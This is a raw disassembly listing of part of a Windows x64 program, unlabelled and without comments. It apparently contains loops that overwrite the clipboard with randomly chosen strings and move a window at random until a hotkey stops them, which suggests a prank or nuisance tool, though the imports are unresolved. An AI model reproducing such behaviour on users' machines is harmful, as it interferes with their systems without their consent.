   140001e3f:	cc                   	int3
   140001e40:	48 83 ec 28          	sub    $0x28,%rsp
   140001e44:	81 fa 12 03 00 00    	cmp    $0x312,%edx
   140001e4a:	75 1c                	jne    0x140001e68
   140001e4c:	49 83 f8 01          	cmp    $0x1,%r8
   140001e50:	75 16                	jne    0x140001e68
   140001e52:	33 c9                	xor    %ecx,%ecx
   140001e54:	c6 05 59 c2 00 00 00 	movb   $0x0,0xc259(%rip)        # 0x14000e0b4
   140001e5b:	ff 15 27 75 00 00    	call   *0x7527(%rip)        # 0x140009388
   140001e61:	33 c0                	xor    %eax,%eax
   140001e63:	48 83 c4 28          	add    $0x28,%rsp
   140001e67:	c3                   	ret
   140001e68:	48 83 c4 28          	add    $0x28,%rsp
   140001e6c:	48 ff 25 9d 74 00 00 	rex.W jmp *0x749d(%rip)        # 0x140009310
   140001e73:	cc                   	int3
   140001e74:	cc                   	int3
   140001e75:	cc                   	int3
   140001e76:	cc                   	int3
   140001e77:	cc                   	int3
   140001e78:	cc                   	int3
   140001e79:	cc                   	int3
   140001e7a:	cc                   	int3
   140001e7b:	cc                   	int3
   140001e7c:	cc                   	int3
   140001e7d:	cc                   	int3
   140001e7e:	cc                   	int3
   140001e7f:	cc                   	int3
   140001e80:	48 83 ec 38          	sub    $0x38,%rsp
   140001e84:	80 3d 29 c2 00 00 00 	cmpb   $0x0,0xc229(%rip)        # 0x14000e0b4
   140001e8b:	0f 84 d1 00 00 00    	je     0x140001f62
   140001e91:	48 89 5c 24 30       	mov    %rbx,0x30(%rsp)
   140001e96:	48 bb ff ff ff ff ff 	movabs $0x7fffffffffffffff,%rbx
   140001e9d:	ff ff 7f 
   140001ea0:	48 89 74 24 28       	mov    %rsi,0x28(%rsp)
   140001ea5:	48 be ff a1 2f 4d ff 	movabs $0x7fffffff4d2fa1ff,%rsi
   140001eac:	ff ff 7f 
   140001eaf:	48 89 7c 24 20       	mov    %rdi,0x20(%rsp)
   140001eb4:	bf 00 5e d0 b2       	mov    $0xb2d05e00,%edi
   140001eb9:	0f 1f 80 00 00 00 00 	nopl   0x0(%rax)
   140001ec0:	45 33 c9             	xor    %r9d,%r9d
   140001ec3:	48 8d 0d d6 7b 00 00 	lea    0x7bd6(%rip),%rcx        # 0x140009aa0
   140001eca:	45 33 c0             	xor    %r8d,%r8d
   140001ecd:	33 d2                	xor    %edx,%edx
   140001ecf:	ff 15 73 75 00 00    	call   *0x7573(%rip)        # 0x140009448
   140001ed5:	48 8d 4c 24 48       	lea    0x48(%rsp),%rcx
   140001eda:	e8 41 f1 ff ff       	call   0x140001020
   140001edf:	48 8b 44 24 48       	mov    0x48(%rsp),%rax
   140001ee4:	48 3b c6             	cmp    %rsi,%rax
   140001ee7:	7d 0b                	jge    0x140001ef4
   140001ee9:	48 8d 0c 38          	lea    (%rax,%rdi,1),%rcx
   140001eed:	48 89 4c 24 40       	mov    %rcx,0x40(%rsp)
   140001ef2:	eb 05                	jmp    0x140001ef9
   140001ef4:	48 89 5c 24 40       	mov    %rbx,0x40(%rsp)
   140001ef9:	48 8d 4c 24 40       	lea    0x40(%rsp),%rcx
   140001efe:	e8 9d 40 00 00       	call   0x140005fa0
   140001f03:	45 33 c9             	xor    %r9d,%r9d
   140001f06:	48 8d 0d c3 7b 00 00 	lea    0x7bc3(%rip),%rcx        # 0x140009ad0
   140001f0d:	45 33 c0             	xor    %r8d,%r8d
   140001f10:	33 d2                	xor    %edx,%edx
   140001f12:	ff 15 30 75 00 00    	call   *0x7530(%rip)        # 0x140009448
   140001f18:	48 8d 4c 24 50       	lea    0x50(%rsp),%rcx
   140001f1d:	e8 fe f0 ff ff       	call   0x140001020
   140001f22:	48 8b 44 24 50       	mov    0x50(%rsp),%rax
   140001f27:	48 3b c6             	cmp    %rsi,%rax
   140001f2a:	7d 0b                	jge    0x140001f37
   140001f2c:	48 8d 0c 38          	lea    (%rax,%rdi,1),%rcx
   140001f30:	48 89 4c 24 40       	mov    %rcx,0x40(%rsp)
   140001f35:	eb 05                	jmp    0x140001f3c
   140001f37:	48 89 5c 24 40       	mov    %rbx,0x40(%rsp)
   140001f3c:	48 8d 4c 24 40       	lea    0x40(%rsp),%rcx
   140001f41:	e8 5a 40 00 00       	call   0x140005fa0
   140001f46:	80 3d 67 c1 00 00 00 	cmpb   $0x0,0xc167(%rip)        # 0x14000e0b4
   140001f4d:	0f 85 6d ff ff ff    	jne    0x140001ec0
   140001f53:	48 8b 7c 24 20       	mov    0x20(%rsp),%rdi
   140001f58:	48 8b 74 24 28       	mov    0x28(%rsp),%rsi
   140001f5d:	48 8b 5c 24 30       	mov    0x30(%rsp),%rbx
   140001f62:	48 83 c4 38          	add    $0x38,%rsp
   140001f66:	c3                   	ret
   140001f67:	cc                   	int3
   140001f68:	cc                   	int3
   140001f69:	cc                   	int3
   140001f6a:	cc                   	int3
   140001f6b:	cc                   	int3
   140001f6c:	cc                   	int3
   140001f6d:	cc                   	int3
   140001f6e:	cc                   	int3
   140001f6f:	cc                   	int3
   140001f70:	40 53                	rex push %rbx
   140001f72:	56                   	push   %rsi
   140001f73:	57                   	push   %rdi
   140001f74:	48 83 ec 50          	sub    $0x50,%rsp
   140001f78:	33 d2                	xor    %edx,%edx
   140001f7a:	48 8d 0d df 79 00 00 	lea    0x79df(%rip),%rcx        # 0x140009960
   140001f81:	ff 15 19 74 00 00    	call   *0x7419(%rip)        # 0x1400093a0
   140001f87:	33 c9                	xor    %ecx,%ecx
   140001f89:	48 8b d8             	mov    %rax,%rbx
   140001f8c:	ff 15 ce 73 00 00    	call   *0x73ce(%rip)        # 0x140009360
   140001f92:	b9 01 00 00 00       	mov    $0x1,%ecx
   140001f97:	8b f8                	mov    %eax,%edi
   140001f99:	ff 15 c1 73 00 00    	call   *0x73c1(%rip)        # 0x140009360
   140001f9f:	80 3d 0e c1 00 00 00 	cmpb   $0x0,0xc10e(%rip)        # 0x14000e0b4
   140001fa6:	8b f0                	mov    %eax,%esi
   140001fa8:	0f 84 07 01 00 00    	je     0x1400020b5
   140001fae:	48 89 ac 24 80 00 00 	mov    %rbp,0x80(%rsp)
   140001fb5:	00 
   140001fb6:	48 bd ff ff ff ff ff 	movabs $0x7fffffffffffffff,%rbp
   140001fbd:	ff ff 7f 
   140001fc0:	4c 89 74 24 48       	mov    %r14,0x48(%rsp)
   140001fc5:	49 be ff 79 c4 5e fe 	movabs $0x7ffffffe5ec479ff,%r14
   140001fcc:	ff ff 7f 
   140001fcf:	4c 89 7c 24 40       	mov    %r15,0x40(%rsp)
   140001fd4:	49 bf 00 86 3b a1 01 	movabs $0x1a13b8600,%r15
   140001fdb:	00 00 00 
   140001fde:	66 90                	xchg   %ax,%ax
   140001fe0:	ff 15 12 76 00 00    	call   *0x7612(%rip)        # 0x1400095f8
   140001fe6:	25 03 00 00 80       	and    $0x80000003,%eax
   140001feb:	7d 07                	jge    0x140001ff4
   140001fed:	ff c8                	dec    %eax
   140001fef:	83 c8 fc             	or     $0xfffffffc,%eax
   140001ff2:	ff c0                	inc    %eax
   140001ff4:	85 c0                	test   %eax,%eax
   140001ff6:	74 4a                	je     0x140002042
   140001ff8:	83 e8 01             	sub    $0x1,%eax
   140001ffb:	74 40                	je     0x14000203d
   140001ffd:	83 e8 01             	sub    $0x1,%eax
   140002000:	74 22                	je     0x140002024
   140002002:	83 f8 01             	cmp    $0x1,%eax
   140002005:	75 61                	jne    0x140002068
   140002007:	c7 44 24 30 04 00 00 	movl   $0x4,0x30(%rsp)
   14000200e:	00 
   14000200f:	44 8d 47 d8          	lea    -0x28(%rdi),%r8d
   140002013:	89 74 24 28          	mov    %esi,0x28(%rsp)
   140002017:	45 33 c9             	xor    %r9d,%r9d
   14000201a:	c7 44 24 20 28 00 00 	movl   $0x28,0x20(%rsp)
   140002021:	00 
   140002022:	eb 39                	jmp    0x14000205d
   140002024:	c7 44 24 30 04 00 00 	movl   $0x4,0x30(%rsp)
   14000202b:	00 
   14000202c:	45 33 c9             	xor    %r9d,%r9d
   14000202f:	89 74 24 28          	mov    %esi,0x28(%rsp)
   140002033:	c7 44 24 20 28 00 00 	movl   $0x28,0x20(%rsp)
   14000203a:	00 
   14000203b:	eb 1d                	jmp    0x14000205a
   14000203d:	45 33 c9             	xor    %r9d,%r9d
   140002040:	eb 04                	jmp    0x140002046
   140002042:	44 8d 4e d8          	lea    -0x28(%rsi),%r9d
   140002046:	c7 44 24 30 04 00 00 	movl   $0x4,0x30(%rsp)
   14000204d:	00 
   14000204e:	c7 44 24 28 28 00 00 	movl   $0x28,0x28(%rsp)
   140002055:	00 
   140002056:	89 7c 24 20          	mov    %edi,0x20(%rsp)
   14000205a:	45 33 c0             	xor    %r8d,%r8d
   14000205d:	33 d2                	xor    %edx,%edx
   14000205f:	48 8b cb             	mov    %rbx,%rcx
   140002062:	ff 15 e0 72 00 00    	call   *0x72e0(%rip)        # 0x140009348
   140002068:	48 8d 4c 24 78       	lea    0x78(%rsp),%rcx
   14000206d:	e8 ae ef ff ff       	call   0x140001020
   140002072:	48 8b 44 24 78       	mov    0x78(%rsp),%rax
   140002077:	49 3b c6             	cmp    %r14,%rax
   14000207a:	7d 0b                	jge    0x140002087
   14000207c:	4a 8d 0c 38          	lea    (%rax,%r15,1),%rcx
   140002080:	48 89 4c 24 70       	mov    %rcx,0x70(%rsp)
   140002085:	eb 05                	jmp    0x14000208c
   140002087:	48 89 6c 24 70       	mov    %rbp,0x70(%rsp)
   14000208c:	48 8d 4c 24 70       	lea    0x70(%rsp),%rcx
   140002091:	e8 0a 3f 00 00       	call   0x140005fa0
   140002096:	80 3d 17 c0 00 00 00 	cmpb   $0x0,0xc017(%rip)        # 0x14000e0b4
   14000209d:	0f 85 3d ff ff ff    	jne    0x140001fe0
   1400020a3:	4c 8b 7c 24 40       	mov    0x40(%rsp),%r15
   1400020a8:	4c 8b 74 24 48       	mov    0x48(%rsp),%r14
   1400020ad:	48 8b ac 24 80 00 00 	mov    0x80(%rsp),%rbp
   1400020b4:	00 
   1400020b5:	48 83 c4 50          	add    $0x50,%rsp
   1400020b9:	5f                   	pop    %rdi
   1400020ba:	5e                   	pop    %rsi
   1400020bb:	5b                   	pop    %rbx
   1400020bc:	c3                   	ret
   1400020bd:	cc                   	int3
   1400020be:	cc                   	int3
   1400020bf:	cc                   	int3
   1400020c0:	40 53                	rex push %rbx
   1400020c2:	48 81 ec 30 01 00 00 	sub    $0x130,%rsp
   1400020c9:	48 8b 05 70 bf 00 00 	mov    0xbf70(%rip),%rax        # 0x14000e040
   1400020d0:	48 33 c4             	xor    %rsp,%rax
   1400020d3:	48 89 84 24 20 01 00 	mov    %rax,0x120(%rsp)
   1400020da:	00 
   1400020db:	bb dc 00 00 00       	mov    $0xdc,%ebx
   1400020e0:	48 8d 4c 24 40       	lea    0x40(%rsp),%rcx
   1400020e5:	44 8b c3             	mov    %ebx,%r8d
   1400020e8:	33 d2                	xor    %edx,%edx
   1400020ea:	e8 a3 5a 00 00       	call   0x140007b92
   1400020ef:	80 3d be bf 00 00 00 	cmpb   $0x0,0xbfbe(%rip)        # 0x14000e0b4
   1400020f6:	66 0f 6f 05 f2 80 00 	movdqa 0x80f2(%rip),%xmm0        # 0x14000a1f0
   1400020fd:	00 
   1400020fe:	f3 0f 7f 44 24 30    	movdqu %xmm0,0x30(%rsp)
   140002104:	66 89 9c 24 84 00 00 	mov    %bx,0x84(%rsp)
   14000210b:	00 
   14000210c:	0f 84 bd 00 00 00    	je     0x1400021cf
   140002112:	48 89 b4 24 40 01 00 	mov    %rsi,0x140(%rsp)
   140002119:	00 
   14000211a:	48 bb ff ff ff ff ff 	movabs $0x7fffffffffffffff,%rbx
   140002121:	ff ff 7f 
   140002124:	48 89 bc 24 48 01 00 	mov    %rdi,0x148(%rsp)
   14000212b:	00 
   14000212c:	48 be 00 c8 17 a8 04 	movabs $0x4a817c800,%rsi
   140002133:	00 00 00 
   140002136:	48 bf ff 37 e8 57 fb 	movabs $0x7ffffffb57e837ff,%rdi
   14000213d:	ff ff 7f 
   140002140:	4c 8d 44 24 40       	lea    0x40(%rsp),%r8
   140002145:	ba ff ff ff ff       	mov    $0xffffffff,%edx
   14000214a:	33 c9                	xor    %ecx,%ecx
   14000214c:	ff 15 e6 71 00 00    	call   *0x71e6(%rip)        # 0x140009338
   140002152:	85 c0                	test   %eax,%eax
   140002154:	74 32                	je     0x140002188
   140002156:	ff 15 9c 74 00 00    	call   *0x749c(%rip)        # 0x1400095f8
   14000215c:	25 03 00 00 80       	and    $0x80000003,%eax
   140002161:	7d 07                	jge    0x14000216a
   140002163:	ff c8                	dec    %eax
   140002165:	83 c8 fc             	or     $0xfffffffc,%eax
   140002168:	ff c0                	inc    %eax
   14000216a:	48 63 c8             	movslq %eax,%rcx
   14000216d:	ba 01 00 00 40       	mov    $0x40000001,%edx
   140002172:	8b 44 8c 30          	mov    0x30(%rsp,%rcx,4),%eax
   140002176:	48 8d 4c 24 40       	lea    0x40(%rsp),%rcx
   14000217b:	89 84 24 94 00 00 00 	mov    %eax,0x94(%rsp)
   140002182:	ff 15 e0 71 00 00    	call   *0x71e0(%rip)        # 0x140009368
   140002188:	48 8d 4c 24 28       	lea    0x28(%rsp),%rcx
   14000218d:	e8 8e ee ff ff       	call   0x140001020
   140002192:	48 8b 44 24 28       	mov    0x28(%rsp),%rax
   140002197:	48 3b c7             	cmp    %rdi,%rax
   14000219a:	7d 0b                	jge    0x1400021a7
   14000219c:	48 8d 0c 30          	lea    (%rax,%rsi,1),%rcx
   1400021a0:	48 89 4c 24 20       	mov    %rcx,0x20(%rsp)
   1400021a5:	eb 05                	jmp    0x1400021ac
   1400021a7:	48 89 5c 24 20       	mov    %rbx,0x20(%rsp)
   1400021ac:	48 8d 4c 24 20       	lea    0x20(%rsp),%rcx
   1400021b1:	e8 ea 3d 00 00       	call   0x140005fa0
   1400021b6:	80 3d f7 be 00 00 00 	cmpb   $0x0,0xbef7(%rip)        # 0x14000e0b4
   1400021bd:	75 81                	jne    0x140002140
   1400021bf:	48 8b bc 24 48 01 00 	mov    0x148(%rsp),%rdi
   1400021c6:	00 
   1400021c7:	48 8b b4 24 40 01 00 	mov    0x140(%rsp),%rsi
   1400021ce:	00 
   1400021cf:	48 8b 8c 24 20 01 00 	mov    0x120(%rsp),%rcx
   1400021d6:	00 
   1400021d7:	48 33 cc             	xor    %rsp,%rcx
   1400021da:	e8 21 4b 00 00       	call   0x140006d00
   1400021df:	48 81 c4 30 01 00 00 	add    $0x130,%rsp
   1400021e6:	5b                   	pop    %rbx
   1400021e7:	c3                   	ret
   1400021e8:	cc                   	int3
   1400021e9:	cc                   	int3
   1400021ea:	cc                   	int3
   1400021eb:	cc                   	int3
   1400021ec:	cc                   	int3
   1400021ed:	cc                   	int3
   1400021ee:	cc                   	int3
   1400021ef:	cc                   	int3
   1400021f0:	4c 8b dc             	mov    %rsp,%r11
   1400021f3:	48 83 ec 78          	sub    $0x78,%rsp
   1400021f7:	80 3d b6 be 00 00 00 	cmpb   $0x0,0xbeb6(%rip)        # 0x14000e0b4
   1400021fe:	48 8d 05 fb 78 00 00 	lea    0x78fb(%rip),%rax        # 0x140009b00
   140002205:	49 89 43 a8          	mov    %rax,-0x58(%r11)
   140002209:	48 8d 05 08 79 00 00 	lea    0x7908(%rip),%rax        # 0x140009b18
   140002210:	49 89 43 b0          	mov    %rax,-0x50(%r11)
   140002214:	48 8d 05 15 79 00 00 	lea    0x7915(%rip),%rax        # 0x140009b30
   14000221b:	49 89 43 b8          	mov    %rax,-0x48(%r11)
   14000221f:	48 8d 05 12 79 00 00 	lea    0x7912(%rip),%rax        # 0x140009b38
   140002226:	49 89 43 c0          	mov    %rax,-0x40(%r11)
   14000222a:	48 8d 05 1f 79 00 00 	lea    0x791f(%rip),%rax        # 0x140009b50
   140002231:	49 89 43 c8          	mov    %rax,-0x38(%r11)
   140002235:	48 8d 05 24 79 00 00 	lea    0x7924(%rip),%rax        # 0x140009b60
   14000223c:	49 89 43 d0          	mov    %rax,-0x30(%r11)
   140002240:	0f 84 76 01 00 00    	je     0x1400023bc
   140002246:	49 89 6b f8          	mov    %rbp,-0x8(%r11)
   14000224a:	48 bd ff ff ff ff ff 	movabs $0x7fffffffffffffff,%rbp
   140002251:	ff ff 7f 
   140002254:	4d 89 73 e0          	mov    %r14,-0x20(%r11)
   140002258:	49 be ff 0d fa d5 fe 	movabs $0x7ffffffed5fa0dff,%r14
   14000225f:	ff ff 7f 
   140002262:	4d 89 7b d8          	mov    %r15,-0x28(%r11)
   140002266:	49 bf 00 f2 05 2a 01 	movabs $0x12a05f200,%r15
   14000226d:	00 00 00 
   140002270:	49 89 5b 18          	mov    %rbx,0x18(%r11)
   140002274:	49 89 73 f0          	mov    %rsi,-0x10(%r11)
   140002278:	49 89 7b e8          	mov    %rdi,-0x18(%r11)
   14000227c:	0f 1f 40 00          	nopl   0x0(%rax)
   140002280:	33 c9                	xor    %ecx,%ecx
   140002282:	ff 15 e8 70 00 00    	call   *0x70e8(%rip)        # 0x140009370
   140002288:	85 c0                	test   %eax,%eax
   14000228a:	0f 84 c1 00 00 00    	je     0x140002351
   140002290:	ff 15 32 71 00 00    	call   *0x7132(%rip)        # 0x1400093c8
   140002296:	ff 15 5c 73 00 00    	call   *0x735c(%rip)        # 0x1400095f8
   14000229c:	44 8b c0             	mov    %eax,%r8d
   14000229f:	b8 ab aa aa 2a       	mov    $0x2aaaaaab,%eax
   1400022a4:	41 f7 e8             	imul   %r8d
   1400022a7:	8b ca                	mov    %edx,%ecx
   1400022a9:	c1 e9 1f             	shr    $0x1f,%ecx
   1400022ac:	03 d1                	add    %ecx,%edx
   1400022ae:	8d 0c 52             	lea    (%rdx,%rdx,2),%ecx
   1400022b1:	03 c9                	add    %ecx,%ecx
   1400022b3:	44 2b c1             	sub    %ecx,%r8d
   1400022b6:	49 63 c0             	movslq %r8d,%rax
   1400022b9:	48 8b 4c c4 20       	mov    0x20(%rsp,%rax,8),%rcx
   1400022be:	48 c7 c0 ff ff ff ff 	mov    $0xffffffffffffffff,%rax
   1400022c5:	66 66 66 0f 1f 84 00 	data16 data16 nopw 0x0(%rax,%rax,1)
   1400022cc:	00 00 00 00 
   1400022d0:	66 83 7c 41 02 00    	cmpw   $0x0,0x2(%rcx,%rax,2)
   1400022d6:	48 8d 40 01          	lea    0x1(%rax),%rax
   1400022da:	75 f4                	jne    0x1400022d0
   1400022dc:	48 8d 3c 45 02 00 00 	lea    0x2(,%rax,2),%rdi
   1400022e3:	00 
   1400022e4:	b9 02 00 00 00       	mov    $0x2,%ecx
   1400022e9:	48 8b d7             	mov    %rdi,%rdx
   1400022ec:	ff 15 06 6e 00 00    	call   *0x6e06(%rip)        # 0x1400090f8
   1400022f2:	48 8b f0             	mov    %rax,%rsi
   1400022f5:	ff 15 fd 72 00 00    	call   *0x72fd(%rip)        # 0x1400095f8
   1400022fb:	44 8b c8             	mov    %eax,%r9d
   1400022fe:	b8 ab aa aa 2a       	mov    $0x2aaaaaab,%eax
   140002303:	41 f7 e9             	imul   %r9d
   140002306:	8b ca                	mov    %edx,%ecx
   140002308:	c1 e9 1f             	shr    $0x1f,%ecx
   14000230b:	03 d1                	add    %ecx,%edx
   14000230d:	8d 0c 52             	lea    (%rdx,%rdx,2),%ecx
   140002310:	03 c9                	add    %ecx,%ecx
   140002312:	44 2b c9             	sub    %ecx,%r9d
   140002315:	48 8b ce             	mov    %rsi,%rcx
   140002318:	49 63 c1             	movslq %r9d,%rax
   14000231b:	48 8b 5c c4 20       	mov    0x20(%rsp,%rax,8),%rbx
   140002320:	ff 15 82 6d 00 00    	call   *0x6d82(%rip)        # 0x1400090a8
   140002326:	4c 8b c7             	mov    %rdi,%r8
   140002329:	48 8b d3             	mov    %rbx,%rdx
   14000232c:	48 8b c8             	mov    %rax,%rcx
   14000232f:	e8 87 59 00 00       	call   0x140007cbb
   140002334:	48 8b ce             	mov    %rsi,%rcx
   140002337:	ff 15 13 6d 00 00    	call   *0x6d13(%rip)        # 0x140009050
   14000233d:	48 8b d6             	mov    %rsi,%rdx
   140002340:	b9 0d 00 00 00       	mov    $0xd,%ecx
   140002345:	ff 15 4d 70 00 00    	call   *0x704d(%rip)        # 0x140009398
   14000234b:	ff 15 2f 70 00 00    	call   *0x702f(%rip)        # 0x140009380
   140002351:	48 8d 8c 24 88 00 00 	lea    0x88(%rsp),%rcx
   140002358:	00 
   140002359:	e8 c2 ec ff ff       	call   0x140001020
   14000235e:	48 8b 84 24 88 00 00 	mov    0x88(%rsp),%rax
   140002365:	00 
   140002366:	49 3b c6             	cmp    %r14,%rax
   140002369:	7d 0e                	jge    0x140002379
   14000236b:	4a 8d 0c 38          	lea    (%rax,%r15,1),%rcx
   14000236f:	48 89 8c 24 80 00 00 	mov    %rcx,0x80(%rsp)
   140002376:	00 
   140002377:	eb 08                	jmp    0x140002381
   140002379:	48 89 ac 24 80 00 00 	mov    %rbp,0x80(%rsp)
   140002380:	00 
   140002381:	48 8d 8c 24 80 00 00 	lea    0x80(%rsp),%rcx
   140002388:	00 
   140002389:	e8 12 3c 00 00       	call   0x140005fa0
   14000238e:	80 3d 1f bd 00 00 00 	cmpb   $0x0,0xbd1f(%rip)        # 0x14000e0b4
   140002395:	0f 85 e5 fe ff ff    	jne    0x140002280
   14000239b:	4c 8b 7c 24 50       	mov    0x50(%rsp),%r15
   1400023a0:	4c 8b 74 24 58       	mov    0x58(%rsp),%r14
   1400023a5:	48 8b 7c 24 60       	mov    0x60(%rsp),%rdi
   1400023aa:	48 8b 74 24 68       	mov    0x68(%rsp),%rsi
   1400023af:	48 8b 6c 24 70       	mov    0x70(%rsp),%rbp
   1400023b4:	48 8b 9c 24 90 00 00 	mov    0x90(%rsp),%rbx
   1400023bb:	00 
   1400023bc:	48 83 c4 78          	add    $0x78,%rsp
   1400023c0:	c3                   	ret
   1400023c1:	cc                   	int3
   1400023c2:	cc                   	int3
   1400023c3:	cc                   	int3
   1400023c4:	cc                   	int3
   1400023c5:	cc                   	int3
   1400023c6:	cc                   	int3
   1400023c7:	cc                   	int3
   1400023c8:	cc                   	int3
   1400023c9:	cc                   	int3
   1400023ca:	cc                   	int3
   1400023cb:	cc                   	int3
   1400023cc:	cc                   	int3
   1400023cd:	cc                   	int3
   1400023ce:	cc                   	int3
   1400023cf:	cc                   	int3
   1400023d0:	48 89 5c 24 08       	mov    %rbx,0x8(%rsp)
   1400023d5:	48 89 74 24 10       	mov    %rsi,0x10(%rsp)
   1400023da:	48 89 7c 24 18       	mov    %rdi,0x18(%rsp)
   1400023df:	4c 89 74 24 20       	mov    %r14,0x20(%rsp)
   1400023e4:	55                   	push   %rbp
   1400023e5:	48 8d ac 24 30 ff ff 	lea    -0xd0(%rsp),%rbp
   1400023ec:	ff 
   1400023ed:	48 81 ec d0 01 00 00 	sub    $0x1d0,%rsp
   1400023f4:	48 8b 05 45 bc 00 00 	mov    0xbc45(%rip),%rax        # 0x14000e040
   1400023fb:	48 33 c4             	xor    %rsp,%rax
   1400023fe:	48 89 85 c0 00 00 00 	mov    %rax,0xc0(%rbp)
   140002405:	33 d2                	xor    %edx,%edx
   140002407:	33 c9                	xor    %ecx,%ecx
   140002409:	ff 15 11 72 00 00    	call   *0x7211(%rip)        # 0x140009620
   14000240f:	85 c0                	test   %eax,%eax
   140002411:	0f 88 0e 03 00 00    	js     0x140002725
   140002417:	45 33 f6             	xor    %r14d,%r14d
   14000241a:	4c 89 74 24 40       	mov    %r14,0x40(%rsp)
   14000241f:	44 89 74 24 38       	mov    %r14d,0x38(%rsp)
   140002424:	4c 89 74 24 30       	mov    %r14,0x30(%rsp)
   140002429:	c7 44 24 28 03 00 00 	movl   $0x3,0x28(%rsp)
   140002430:	00 
   140002431:	c7 44 24 20 06 00 00 	movl   $0x6,0x20(%rsp)
   140002438:	00 
   140002439:	45 33 c9             	xor    %r9d,%r9d
   14000243c:	45 33 c0             	xor    %r8d,%r8d
   14000243f:	bf ff ff ff ff       	mov    $0xffffffff,%edi
   140002444:	8b d7                	mov    %edi,%edx
   140002446:	33 c9                	xor    %ecx,%ecx
   140002448:	ff 15 ca 71 00 00    	call   *0x71ca(%rip)        # 0x140009618
   14000244e:	8b d8                	mov    %eax,%ebx
   140002450:	85 c0                	test   %eax,%eax
   140002452:	0f 88 c5 02 00 00    	js     0x14000271d
   140002458:	4c 89 75 68          	mov    %r14,0x68(%rbp)
   14000245c:	48 8d 45 68          	lea    0x68(%rbp),%rax
   140002460:	48 89 44 24 20       	mov    %rax,0x20(%rsp)
   140002465:	4c 8d 0d 7c 72 00 00 	lea    0x727c(%rip),%r9        # 0x1400096e8
   14000246c:	33 d2                	xor    %edx,%edx
   14000246e:	41 b8 01 00 00 00    	mov    $0x1,%r8d
   140002474:	48 8d 0d 7d 72 00 00 	lea    0x727d(%rip),%rcx        # 0x1400096f8
   14000247b:	ff 15 8f 71 00 00    	call   *0x718f(%rip)        # 0x140009610
   140002481:	8b d8                	mov    %eax,%ebx
   140002483:	85 c0                	test   %eax,%eax
   140002485:	0f 88 92 02 00 00    	js     0x14000271d
   14000248b:	48 8d 4d a8          	lea    -0x58(%rbp),%rcx
   14000248f:	ff 15 13 6e 00 00    	call   *0x6e13(%rip)        # 0x1400092a8
   140002495:	90                   	nop
   140002496:	0f 10 45 a8          	movups -0x58(%rbp),%xmm0
   14000249a:	0f 11 44 24 70       	movups %xmm0,0x70(%rsp)
   14000249f:	f2 0f 10 45 b8       	movsd  -0x48(%rbp),%xmm0
   1400024a4:	f2 0f 11 44 24 58    	movsd  %xmm0,0x58(%rsp)
   1400024aa:	48 8d 4d 90          	lea    -0x70(%rbp),%rcx
   1400024ae:	ff 15 f4 6d 00 00    	call   *0x6df4(%rip)        # 0x1400092a8
   1400024b4:	90                   	nop
   1400024b5:	0f 10 45 90          	movups -0x70(%rbp),%xmm0
   1400024b9:	0f 11 45 c0          	movups %xmm0,-0x40(%rbp)
   1400024bd:	f2 0f 10 45 a0       	movsd  -0x60(%rbp),%xmm0
   1400024c2:	f2 0f 11 44 24 60    	movsd  %xmm0,0x60(%rsp)
   1400024c8:	48 8d 4d 20          	lea    0x20(%rbp),%rcx
   1400024cc:	ff 15 d6 6d 00 00    	call   *0x6dd6(%rip)        # 0x1400092a8
   1400024d2:	90                   	nop
   1400024d3:	0f 10 45 20          	movups 0x20(%rbp),%xmm0
   1400024d7:	0f 11 45 e0          	movups %xmm0,-0x20(%rbp)
   1400024db:	f2 0f 10 45 30       	movsd  0x30(%rbp),%xmm0
   1400024e0:	f2 0f 11 44 24 50    	movsd  %xmm0,0x50(%rsp)
   1400024e6:	48 8d 4d 00          	lea    0x0(%rbp),%rcx
   1400024ea:	ff 15 b8 6d 00 00    	call   *0x6db8(%rip)        # 0x1400092a8
   1400024f0:	90                   	nop
   1400024f1:	0f 10 44 24 70       	movups 0x70(%rsp),%xmm0
   1400024f6:	0f 29 44 24 70       	movaps %xmm0,0x70(%rsp)
   1400024fb:	f2 0f 10 44 24 58    	movsd  0x58(%rsp),%xmm0
   140002501:	f2 0f 11 45 80       	movsd  %xmm0,-0x80(%rbp)
   140002506:	0f 10 45 c0          	movups -0x40(%rbp),%xmm0
   14000250a:	0f 29 45 c0          	movaps %xmm0,-0x40(%rbp)
   14000250e:	f2 0f 10 44 24 60    	movsd  0x60(%rsp),%xmm0
   140002514:	f2 0f 11 45 d0       	movsd  %xmm0,-0x30(%rbp)
   140002519:	0f 10 45 e0          	movups -0x20(%rbp),%xmm0
   14000251d:	0f 29 45 e0          	movaps %xmm0,-0x20(%rbp)
   140002521:	f2 0f 10 44 24 50    	movsd  0x50(%rsp),%xmm0
   140002527:	f2 0f 11 45 f0       	movsd  %xmm0,-0x10(%rbp)
   14000252c:	0f 10 45 00          	movups 0x0(%rbp),%xmm0
   140002530:	0f 29 45 40          	movaps %xmm0,0x40(%rbp)
   140002534:	f2 0f 10 4d 10       	movsd  0x10(%rbp),%xmm1
   140002539:	f2 0f 11 4d 50       	movsd  %xmm1,0x50(%rbp)
   14000253e:	48 8b 4d 68          	mov    0x68(%rbp),%rcx
   140002542:	48 8b 01             	mov    (%rcx),%rax
   140002545:	48 8d 54 24 70       	lea    0x70(%rsp),%rdx
   14000254a:	48 89 54 24 20       	mov    %rdx,0x20(%rsp)
   14000254f:	4c 8d 4d c0          	lea    -0x40(%rbp),%r9
   140002553:	4c 8d 45 e0          	lea    -0x20(%rbp),%r8
   140002557:	48 8d 55 40          	lea    0x40(%rbp),%rdx
   14000255b:	ff 50 50             	call   *0x50(%rax)
   14000255e:	8b d8                	mov    %eax,%ebx
   140002560:	48 8d 4d 00          	lea    0x0(%rbp),%rcx
   140002564:	ff 15 26 6d 00 00    	call   *0x6d26(%rip)        # 0x140009290
   14000256a:	90                   	nop
   14000256b:	48 8d 4d 20          	lea    0x20(%rbp),%rcx
   14000256f:	ff 15 1b 6d 00 00    	call   *0x6d1b(%rip)        # 0x140009290
   140002575:	90                   	nop
   140002576:	48 8d 4d 90          	lea    -0x70(%rbp),%rcx
   14000257a:	ff 15 10 6d 00 00    	call   *0x6d10(%rip)        # 0x140009290
   140002580:	90                   	nop
   140002581:	48 8d 4d a8          	lea    -0x58(%rbp),%rcx
   140002585:	ff 15 05 6d 00 00    	call   *0x6d05(%rip)        # 0x140009290
   14000258b:	85 db                	test   %ebx,%ebx
   14000258d:	0f 88 6b 03 00 00    	js     0x1400028fe
   140002593:	4c 89 75 70          	mov    %r14,0x70(%rbp)
   140002597:	b9 18 00 00 00       	mov    $0x18,%ecx
   14000259c:	e8 87 47 00 00       	call   0x140006d28
   1400025a1:	48 8b d8             	mov    %rax,%rbx
